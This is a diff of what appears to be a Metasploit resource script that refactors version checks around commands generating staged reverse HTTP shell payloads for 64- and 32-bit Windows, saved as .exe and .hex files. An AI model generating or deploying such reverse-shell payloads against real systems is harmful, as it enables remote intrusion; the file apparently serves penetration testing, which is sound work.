@@ -37,14 +37,9 @@ set PayloadUUIDName ParanoidStagedExe64
 <ruby>
 if framework.version.start_with?("5.")
 	run_single("generate -f exe -o /pentest/share/reverse.http.windows_amd64.exe")
-else
-	run_single("generate -t exe -f /pentest/share/reverse.http.windows_amd64.exe")
-end
-</ruby>
-<ruby>
-if framework.version.start_with?("5.")
 	run_single("generate -f hex -o /pentest/share/reverse.http.windows_amd64.hex")
 else
+	run_single("generate -t exe -f /pentest/share/reverse.http.windows_amd64.exe")
 	run_single("generate -t hex -f /pentest/share/reverse.http.windows_amd64.hex")
 end
 </ruby>
@@ -54,14 +49,9 @@ set PayloadUUIDName ParanoidStagedExe32
 <ruby>
 if framework.version.start_with?("5.")
 	run_single("generate -f exe -o /pentest/share/reverse.http.windows_i386.exe")
-else
-	run_single("generate -t exe -f /pentest/share/reverse.http.windows_i386.exe")
-end
-</ruby>
-<ruby>
-if framework.version.start_with?("5.")
 	run_single("generate -f hex -o /pentest/share/reverse.http.windows_i386.hex")
 else
+	run_single("generate -t exe -f /pentest/share/reverse.http.windows_i386.exe")
 	run_single("generate -t hex -f /pentest/share/reverse.http.windows_i386.hex")
 end
 </ruby>
